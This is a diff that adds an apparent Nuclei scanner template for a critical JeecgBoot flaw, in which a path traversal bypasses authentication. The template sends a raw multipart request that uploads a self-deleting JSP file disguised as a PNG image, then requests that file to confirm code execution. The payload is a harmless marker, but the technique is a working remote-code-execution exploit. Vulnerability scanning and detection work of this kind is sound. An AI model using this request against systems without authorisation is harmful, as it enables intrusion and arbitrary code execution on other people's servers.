@@ -1,0 +1,57 @@
+id: Jeecg-commonController
+info:
+  name: API Path Traversal Leading to Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits a path traversal vulnerability in the /api endpoint to bypass authentication, allowing attackers to upload malicious JSP files via the commonController.do endpoint and achieve remote code execution.
+  tags: rce,path-traversal,api
+
+http:
+  - raw:
+      - |
+        POST /api/../commonController.do?parserXml HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Length: 463
+        User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
+        Connection: close
+
+        ------WebKitFormBoundarygcflwtei
+        Content-Disposition: form-data; name="name"
+
+        zW9YCa.png
+        ------WebKitFormBoundarygcflwtei
+        Content-Disposition: form-data; name="documentTitle"
+
+        blank
+        ------WebKitFormBoundarygcflwtei
+        Content-Disposition: form-data; name="file"; filename="zW9YCa.jsp"
+        Content-Type: image/png
+
+        <% out.println("HelloWorld");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundarygcflwtei--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/zW9YCa.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "HelloWorld"
